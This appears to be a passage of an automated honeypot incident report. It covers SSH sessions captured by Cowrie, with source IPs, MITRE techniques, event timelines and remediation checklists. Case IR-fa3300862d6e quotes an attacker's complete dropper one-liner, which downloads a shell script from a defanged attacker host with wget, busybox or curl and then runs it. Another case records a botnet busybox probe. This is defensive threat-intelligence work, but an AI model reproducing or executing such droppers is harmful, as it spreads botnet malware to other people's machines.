| `2026-11-18 01:04:32` | `cowrie.session.connect` |
| `2026-11-18 01:04:33` | `cowrie.client.version` |
| `2026-11-18 01:04:33` | `cowrie.client.kex` |
| `2026-11-18 01:04:34` | `cowrie.login.success` |
| `2026-11-18 01:04:35` | `cowrie.session.params` |
| `2026-11-18 01:04:35` | `cowrie.command.input` |
| `2026-11-18 01:04:35` | `cowrie.log.closed` |
| `2026-11-18 01:04:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]171` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf03ecc613c0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-18 01:10 |
| **Last Seen** | 2026-11-18 01:10 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6c3779f8324deb7c04c8eeac6bc2ad5f_small_control'"'"' '"'"'check_6c3779f8324deb7c04c8eeac6bc2ad5f'"'"'', printf '\n%s|%s\n' 'check_6c3779f8324deb7c04c8eeac6bc2ad5f_small_control' 'check_6c3779f8324deb7c04c8eeac6bc2ad5f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6c3779f8324deb7c04c8eeac6bc2ad5f_small_math'"'"' "$((785*504+59))"', (785*504+59, printf '\n%s|%s\n' 'check_6c3779f8324deb7c04c8eeac6bc2ad5f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 01:10:42` | `cowrie.session.connect` |
| `2026-11-18 01:10:42` | `cowrie.client.version` |
| `2026-11-18 01:10:42` | `cowrie.client.kex` |
| `2026-11-18 01:10:45` | `cowrie.login.success` |
| `2026-11-18 01:10:48` | `cowrie.client.size` |
| `2026-11-18 01:10:48` | `cowrie.session.params` |
| `2026-11-18 01:10:49` | `cowrie.command.input` |
| `2026-11-18 01:10:49` | `cowrie.command.input` |
| `2026-11-18 01:10:49` | `cowrie.command.input` |
| `2026-11-18 01:10:49` | `cowrie.command.input` |
| `2026-11-18 01:10:49` | `cowrie.command.input` |
| `2026-11-18 01:10:49` | `cowrie.command.input` |
| `2026-11-18 01:10:49` | `cowrie.command.input` |
| `2026-11-18 01:10:49` | `cowrie.command.input` |
| `2026-11-18 01:10:49` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-695f9bbf6f27

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-18 01:12 |
| **Last Seen** | 2026-11-18 01:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_eccfd2b37bbd866f72a913021df3e183_small_control'"'"' '"'"'check_eccfd2b37bbd866f72a913021df3e183'"'"'', printf '\n%s|%s\n' 'check_eccfd2b37bbd866f72a913021df3e183_small_control' 'check_eccfd2b37bbd866f72a913021df3e183', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_eccfd2b37bbd866f72a913021df3e183_small_math'"'"' "$((804*426+96))"', (804*426+96, printf '\n%s|%s\n' 'check_eccfd2b37bbd866f72a913021df3e183_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 01:12:53` | `cowrie.session.connect` |
| `2026-11-18 01:12:54` | `cowrie.client.version` |
| `2026-11-18 01:12:54` | `cowrie.client.kex` |
| `2026-11-18 01:12:57` | `cowrie.login.success` |
| `2026-11-18 01:12:59` | `cowrie.client.size` |
| `2026-11-18 01:13:00` | `cowrie.session.params` |
| `2026-11-18 01:13:01` | `cowrie.command.input` |
| `2026-11-18 01:13:01` | `cowrie.command.input` |
| `2026-11-18 01:13:01` | `cowrie.command.input` |
| `2026-11-18 01:13:01` | `cowrie.command.input` |
| `2026-11-18 01:13:01` | `cowrie.command.input` |
| `2026-11-18 01:13:01` | `cowrie.command.input` |
| `2026-11-18 01:13:01` | `cowrie.command.input` |
| `2026-11-18 01:13:01` | `cowrie.command.input` |
| `2026-11-18 01:13:01` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3143cb1e2fdf

| Field | Detail |
|---|---|
| **Source IP** | `187.9.232[.]170` |
| **First Seen** | 2026-11-18 01:13 |
| **Last Seen** | 2026-11-18 01:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 01:13:41` | `cowrie.session.connect` |
| `2026-11-18 01:13:42` | `cowrie.client.version` |
| `2026-11-18 01:13:42` | `cowrie.client.kex` |
| `2026-11-18 01:13:44` | `cowrie.login.success` |
| `2026-11-18 01:13:44` | `cowrie.direct-tcpip.request` |
| `2026-11-18 01:13:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.9.232[.]170` to AbuseIPDB if not already reported
- [ ] Block `187.9.232[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7935e929a588

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-18 01:15 |
| **Last Seen** | 2026-11-18 01:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_398b950c204ce576370a6f066d754ba3_small_control'"'"' '"'"'check_398b950c204ce576370a6f066d754ba3'"'"'', printf '\n%s|%s\n' 'check_398b950c204ce576370a6f066d754ba3_small_control' 'check_398b950c204ce576370a6f066d754ba3', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_398b950c204ce576370a6f066d754ba3_small_math'"'"' "$((774*499+85))"', (774*499+85, printf '\n%s|%s\n' 'check_398b950c204ce576370a6f066d754ba3_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 01:15:11` | `cowrie.session.connect` |
| `2026-11-18 01:15:11` | `cowrie.client.version` |
| `2026-11-18 01:15:11` | `cowrie.client.kex` |
| `2026-11-18 01:15:14` | `cowrie.login.success` |
| `2026-11-18 01:15:16` | `cowrie.client.size` |
| `2026-11-18 01:15:17` | `cowrie.session.params` |
| `2026-11-18 01:15:18` | `cowrie.command.input` |
| `2026-11-18 01:15:18` | `cowrie.command.input` |
| `2026-11-18 01:15:18` | `cowrie.command.input` |
| `2026-11-18 01:15:18` | `cowrie.command.input` |
| `2026-11-18 01:15:18` | `cowrie.command.input` |
| `2026-11-18 01:15:18` | `cowrie.command.input` |
| `2026-11-18 01:15:18` | `cowrie.command.input` |
| `2026-11-18 01:15:18` | `cowrie.command.input` |
| `2026-11-18 01:15:18` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cefbec08818f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-18 01:17 |
| **Last Seen** | 2026-11-18 01:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 01:17:30` | `cowrie.session.connect` |
| `2026-11-18 01:17:31` | `cowrie.client.version` |
| `2026-11-18 01:17:31` | `cowrie.client.kex` |
| `2026-11-18 01:17:38` | `cowrie.login.success` |
| `2026-11-18 01:17:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c346091af8dd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-18 01:20 |
| **Last Seen** | 2026-11-18 01:20 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_306867ca60a61f945aca7dd204b46174_small_control'"'"' '"'"'check_306867ca60a61f945aca7dd204b46174'"'"'', printf '\n%s|%s\n' 'check_306867ca60a61f945aca7dd204b46174_small_control' 'check_306867ca60a61f945aca7dd204b46174', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_306867ca60a61f945aca7dd204b46174_small_math'"'"' "$((429*805+74))"', (429*805+74, printf '\n%s|%s\n' 'check_306867ca60a61f945aca7dd204b46174_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 01:20:18` | `cowrie.session.connect` |
| `2026-11-18 01:20:20` | `cowrie.client.version` |
| `2026-11-18 01:20:20` | `cowrie.client.kex` |
| `2026-11-18 01:20:26` | `cowrie.login.success` |
| `2026-11-18 01:20:30` | `cowrie.client.size` |
| `2026-11-18 01:20:31` | `cowrie.session.params` |
| `2026-11-18 01:20:33` | `cowrie.command.input` |
| `2026-11-18 01:20:33` | `cowrie.command.input` |
| `2026-11-18 01:20:33` | `cowrie.command.input` |
| `2026-11-18 01:20:33` | `cowrie.command.input` |
| `2026-11-18 01:20:33` | `cowrie.command.input` |
| `2026-11-18 01:20:33` | `cowrie.command.input` |
| `2026-11-18 01:20:33` | `cowrie.command.input` |
| `2026-11-18 01:20:33` | `cowrie.command.input` |
| `2026-11-18 01:20:33` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f000ccc23c7d

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-11-18 01:20 |
| **Last Seen** | 2026-11-18 01:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, linuxshell, system, sh, ls /home; /bin/busybox BOTNET` |
| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 01:20:34` | `cowrie.session.connect` |
| `2026-11-18 01:20:34` | `cowrie.login.success` |
| `2026-11-18 01:20:35` | `cowrie.session.params` |
| `2026-11-18 01:20:35` | `cowrie.command.input` |
| `2026-11-18 01:20:35` | `cowrie.command.failed` |
| `2026-11-18 01:20:35` | `cowrie.command.input` |
| `2026-11-18 01:20:35` | `cowrie.command.failed` |
| `2026-11-18 01:20:35` | `cowrie.command.input` |
| `2026-11-18 01:20:35` | `cowrie.command.failed` |
| `2026-11-18 01:20:35` | `cowrie.command.input` |
| `2026-11-18 01:20:35` | `cowrie.command.input` |
| `2026-11-18 01:20:35` | `cowrie.command.input` |
| `2026-11-18 01:20:35` | `cowrie.session.file_download` |
| `2026-11-18 01:20:36` | `cowrie.session.file_download` |
| `2026-11-18 01:20:36` | `cowrie.session.file_download` |
| … | _3 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa3300862d6e

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-11-18 01:20 |
| **Last Seen** | 2026-11-18 01:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&` |
| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 01:20:35` | `cowrie.session.connect` |
| `2026-11-18 01:20:36` | `cowrie.login.success` |
| `2026-11-18 01:20:36` | `cowrie.session.params` |
| `2026-11-18 01:20:36` | `cowrie.command.input` |
| `2026-11-18 01:20:36` | `cowrie.session.file_download` |
| `2026-11-18 01:20:37` | `cowrie.session.file_download` |
| `2026-11-18 01:20:37` | `cowrie.session.file_download` |
| `2026-11-18 01:20:37` | `cowrie.session.file_download.failed` |
| `2026-11-18 01:20:39` | `cowrie.log.closed` |
| `2026-11-18 01:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f84802733288

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-11-18 01:22 |
| **Last Seen** | 2026-11-18 01:22 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_71e63a5229758b6bd38fa149cd4b90d2_small_control'"'"' '"'"'check_71e63a5229758b6bd38fa149cd4b90d2'"'"'', printf '\n%s|%s\n' 'check_71e63a5229758b6bd38fa149cd4b90d2_small_control' 'check_71e63a5229758b6bd38fa149cd4b90d2', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_71e63a5229758b6bd38fa149cd4b90d2_small_math'"'"' "$((246*66+59))"', (246*66+59, printf '\n%s|%s\n' 'check_71e63a5229758b6bd38fa149cd4b90d2_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-18 01:22:36` | `cowrie.session.connect` |
| `2026-11-18 01:22:38` | `cowrie.client.version` |
| `2026-11-18 01:22:38` | `cowrie.client.kex` |
| `2026-11-18 01:22:43` | `cowrie.login.success` |
| `2026-11-18 01:22:46` | `cowrie.client.size` |
| `2026-11-18 01:22:48` | `cowrie.session.params` |
| `2026-11-18 01:22:49` | `cowrie.command.input` |
| `2026-11-18 01:22:49` | `cowrie.command.input` |
| `2026-11-18 01:22:49` | `cowrie.command.input` |
| `2026-11-18 01:22:49` | `cowrie.command.input` |
| `2026-11-18 01:22:49` | `cowrie.command.input` |
| `2026-11-18 01:22:49` | `cowrie.command.input` |
| `2026-11-18 01:22:49` | `cowrie.command.input` |
| `2026-11-18 01:22:49` | `cowrie.command.input` |
| `2026-11-18 01:22:49` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (75) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-3d2b4e269a89 | HIGH | `92.118.39[.]77` | 2026-11-18 01:24 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f53eb3c066f1 | HIGH | `92.118.39[.]77` | 2026-11-18 01:26 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-47cbd3b80089 | HIGH | `110.25.110[.]132` | 2026-11-18 01:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-aaae9bc16618 | HIGH | `92.118.39[.]77` | 2026-11-18 01:27 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-92c68293d525 | HIGH | `93.190.110[.]226` | 2026-11-18 01:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1dcdd7193760 | HIGH | `152.32.218[.]149` | 2026-11-18 01:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-340a12a0805f | HIGH | `152.32.218[.]149` | 2026-11-18 01:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-88a894a238b6 | HIGH | `50.6.241[.]208` | 2026-11-18 01:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e5338b2a70e4 | HIGH | `50.6.241[.]208` | 2026-11-18 01:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d4586ba642e9 | HIGH | `144.31.185[.]241` | 2026-11-18 01:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3cd4d1bdefe5 | HIGH | `144.31.185[.]241` | 2026-11-18 01:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6050ea0fb3e3 | HIGH | `80.94.95[.]118` | 2026-11-18 01:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b084dfb5f4bc | HIGH | `138.226.239[.]234` | 2026-11-18 01:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bc6bde0599e3 | HIGH | `77.90.185[.]29` | 2026-11-18 01:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1748a1c764b8 | HIGH | `213.55.79[.]195` | 2026-11-18 01:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d4d73bf21417 | HIGH | `196.189.59[.]226` | 2026-11-18 01:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-30b75dc32daa | HIGH | `195.222.43[.]138` | 2026-11-18 01:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a0c82ee4d464 | HIGH | `182.76.36[.]62` | 2026-11-18 01:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-448ab898b542 | HIGH | `24.234.63[.]228` | 2026-11-18 01:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-463ce9f5b554 | HIGH | `67.52.95[.]38` | 2026-11-18 02:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bcf79a82d73f | HIGH | `67.52.95[.]38` | 2026-11-18 02:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7d322c0cb472 | HIGH | `143.110.145[.]158` | 2026-11-18 02:06 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-934244622297 | HIGH | `143.110.145[.]158` | 2026-11-18 02:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b547211aec0d | HIGH | `196.191.142[.]67` | 2026-11-18 02:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dbcc6a70f606 | HIGH | `104.244.79[.]113` | 2026-11-18 02:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fb3833bf8cbe | HIGH | `92.118.39[.]64` | 2026-11-18 02:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-77f817ec91c1 | HIGH | `92.118.39[.]64` | 2026-11-18 02:57 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c62f6a945aad | HIGH | `35.210.203[.]235` | 2026-11-18 02:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a7f121ee8bc0 | HIGH | `68.225.56[.]119` | 2026-11-18 02:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6e22368b1218 | HIGH | `178.178.194[.]134` | 2026-11-18 02:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-50f497bd77ff | HIGH | `92.118.39[.]64` | 2026-11-18 03:00 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-28accf83c1e9 | HIGH | `92.118.39[.]64` | 2026-11-18 03:02 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-21cf7aecc69a | HIGH | `92.118.39[.]64` | 2026-11-18 03:05 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c8ed2779616a | HIGH | `105.247.89[.]210` | 2026-11-18 03:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c4bfacf16c82 | HIGH | `194.154.92[.]163` | 2026-11-18 03:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-475be6aafa93 | HIGH | `80.223.190[.]179` | 2026-11-18 03:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5a86bc9c9315 | HIGH | `218.149.228[.]159` | 2026-11-18 03:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c73ce9188968 | HIGH | `121.10.215[.]142` | 2026-11-18 03:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bc69837acf16 | HIGH | `92.118.39[.]72` | 2026-11-18 03:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9c8fb03095bc | HIGH | `92.118.39[.]64` | 2026-11-18 03:23 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b01ba7b3cfa2 | HIGH | `35.210.38[.]107` | 2026-11-18 03:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-23b8be1bc5f3 | HIGH | `35.210.233[.]15` | 2026-11-18 03:27 | Y | 3 | 0 | `T1078` |
| IR-af69f77bfcb7 | HIGH | `34.146.217[.]105` | 2026-11-18 03:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d99c605aacda | HIGH | `203.193.137[.]250` | 2026-11-18 03:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c356ec39438f | HIGH | `83.233.97[.]33` | 2026-11-18 03:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-abd062d80667 | HIGH | `103.230.176[.]152` | 2026-11-18 03:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b4887383ef6e | HIGH | `85.19.195[.]12` | 2026-11-18 03:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-42a650bf52a7 | HIGH | `179.184.218[.]49` | 2026-11-18 03:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-23650a7bb770 | HIGH | `60.223.245[.]120` | 2026-11-18 03:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-15cf320782d5 | HIGH | `186.179.80[.]12` | 2026-11-18 03:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-db68142bd1b8 | HIGH | `49.206.201[.]253` | 2026-11-18 03:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2fdc1252d5e7 | HIGH | `35.206.160[.]252` | 2026-11-18 03:40 | Y | 3 | 0 | `T1078` |
| IR-76bcbd0a6147 | HIGH | `14.103.123[.]67` | 2026-11-18 03:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-83d135ae436f | HIGH | `14.103.123[.]67` | 2026-11-18 03:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4c9f995cca29 | HIGH | `80.94.95[.]118` | 2026-11-18 03:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-21d1f73f59d2 | HIGH | `77.90.185[.]29` | 2026-11-18 03:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cec1fe1a2b8b | HIGH | `138.226.239[.]234` | 2026-11-18 03:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4532000b0da1 | HIGH | `35.210.240[.]68` | 2026-11-18 04:03 | Y | 3 | 0 | `T1078` |
| IR-c3ca32ad5cf1 | HIGH | `117.250.233[.]20` | 2026-11-18 04:04 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c32cdd374bb1 | HIGH | `92.118.39[.]72` | 2026-11-18 04:05 | Y | 1 | 0 | `T1078 · T1592` |
| IR-1dc8375be197 | HIGH | `193.32.162[.]15` | 2026-11-18 04:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5fd0d121558c | HIGH | `78.128.112[.]74` | 2026-11-18 04:08 | Y | 1 | 0 | `T1078 · T1592` |
| IR-214657d19e64 | HIGH | `103.209.179[.]31` | 2026-11-18 04:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-506ab802b11d | HIGH | `211.195.108[.]229` | 2026-11-18 04:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6548441c98e1 | HIGH | `70.169.4[.]116` | 2026-11-18 04:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-82e8773275de | HIGH | `59.11.53[.]94` | 2026-11-18 04:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-486c43b58add | HIGH | `218.156.38[.]44` | 2026-11-18 04:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-91f7a75024ce | HIGH | `42.200.73[.]3` | 2026-11-18 04:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-76f0a488f74d | HIGH | `121.179.93[.]147` | 2026-11-18 04:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f8cf7afa9a83 | HIGH | `176.53.159[.]196` | 2026-11-18 04:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-99e2f5b4d3b0 | HIGH | `193.187.110[.]160` | 2026-11-18 04:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c919fd153761 | HIGH | `173.17.162[.]121` | 2026-11-18 04:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4282822448c1 | HIGH | `65.20.143[.]114` | 2026-11-18 04:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6f82b1841ec9 | HIGH | `172.174.17[.]234` | 2026-11-18 04:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4255d503739d | HIGH | `172.174.17[.]234` | 2026-11-18 04:44 | Y | 0 | 0 | `T1078 · T1592` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.19.117[.]129` | **3** | 2026-11-18 00:24 | 2026-11-18 04:25 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-18 01:50 | 2026-11-18 02:26 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.159.167[.]129` | 1 | 2026-11-18 00:53 | 2026-11-18 00:53 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]171` | 1 | 2026-11-18 01:04 | 2026-11-18 01:04 | 8s | 0 | `T1592` | 🟢 LOW |
| `111.33.71[.]238` | 1 | 2026-11-18 04:49 | 2026-11-18 04:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `112.168.255[.]132` | 1 | 2026-11-18 03:18 | 2026-11-18 03:18 | 3s | 0 | `T1592` | 🟢 LOW |
| `117.250.233[.]20` | 1 | 2026-11-18 04:04 | 2026-11-18 04:04 | 1s | 0 | `T1592` | 🟢 LOW |
| `119.199.157[.]77` | 1 | 2026-11-18 02:10 | 2026-11-18 02:11 | 19s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-18 04:29 | 2026-11-18 04:30 | 37s | 0 | `T1592` | 🟢 LOW |
| `138.226.239[.]7` | 1 | 2026-11-18 01:48 | 2026-11-18 01:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `161.35.73[.]227` | 1 | 2026-11-18 03:01 | 2026-11-18 03:01 | 20s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-18 00:41 | 2026-11-18 00:42 | 41s | 0 | `T1592` | 🟢 LOW |
